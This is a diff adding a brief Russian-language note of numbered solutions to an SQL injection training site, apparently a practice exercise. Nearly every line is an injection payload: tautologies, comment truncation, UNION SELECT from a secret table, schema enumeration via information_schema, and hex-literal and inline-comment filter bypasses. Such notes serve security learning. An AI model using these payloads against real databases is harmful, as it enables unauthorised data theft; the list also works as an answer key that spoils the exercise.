@@ -1,0 +1,9 @@
+http://sql.training.hackerdom.ru/
+Пояснение: не забываем пробелы с двух сторон " -- "
+1. SELECT * FROM users where id=12
+2. ' or id=9 or login='
+3. ' or id=13 --
+4. ' UNION SELECT * FROM secret -- 
+5. Узнаем структуру таблицы: ' union select 1, table_name,column_name from information_schema.columns -- . Получаем данные из таблицы:  ' union select 1, dfgfddfgdfdfdf,dfgdfgfdg from secret -- 
+6. https://portswigger.net/support/sql-injection-bypassing-common-filters https://dev.mysql.com/doc/refman/5.6/en/hexadecimal-literals.html -1 UNION SELECT id,login,pass from users where login=0x676f64 --
+7. https://forum.antichat.ru/threads/423579/page-2 -1/**/or/**/login/**/like/**/0x2567656e746f6f25
